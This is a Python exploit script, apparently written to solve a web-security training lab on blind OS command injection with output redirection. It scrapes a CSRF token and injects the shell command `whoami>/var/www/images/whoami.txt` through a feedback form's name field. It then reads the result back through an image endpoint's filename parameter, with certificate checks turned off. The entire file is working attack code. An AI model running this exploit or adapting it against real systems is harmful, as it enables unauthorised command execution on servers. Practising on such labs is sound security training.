import requests
import re
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind OS command injection with output redirection"

def run(url, payload=None, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False
    url = url.rstrip('/')

    print(Fore.WHITE + "[*] Fetching the feedback page", flush=True)
    try:
        feedback_page = session.get(f"{url}/feedback", allow_redirects=False)
    except Exception as e:
        print(Fore.RED + f"[!] Failed to fetch feedback page: {e}")
        return False

    print(Fore.WHITE + "[*] Extracting CSRF token", flush=True)
    try:
        csrf_token = re.search(r'name="csrf"\s+value="(.+?)"', feedback_page.text).group(1)
    except Exception:
        print(Fore.RED + "[!] Failed to extract CSRF token.")
        return False

    file_name = "whoami.txt"
    print(Fore.WHITE + "[*] Injecting payload and redirecting output to: " + Fore.YELLOW + file_name)

    payload = f"`whoami>/var/www/images/{file_name}`"
    data = {
        "csrf": csrf_token,
        "name": payload,
        "email": "mystic_mido@snehbavarva.com",
        "subject": "snehbavarva.com",
        "message": "snehbavarva.com"
    }

    try:
        session.post(f"{url}/feedback/submit", data=data, allow_redirects=False)
    except Exception as e:
        print(Fore.RED + f"[!] Failed to submit payload: {e}")
        return False

    print(Fore.WHITE + f"[*] Reading back output from file: {file_name}", flush=True)
    try:
        created_file = session.get(f"{url}/image?filename={file_name}", allow_redirects=False)
        print(Fore.GREEN + "[+] whoami => " + Fore.YELLOW + created_file.text.strip())
        return True
    except Exception as e:
        print(Fore.RED + f"[!] Failed to fetch created file: {e}")
        return False
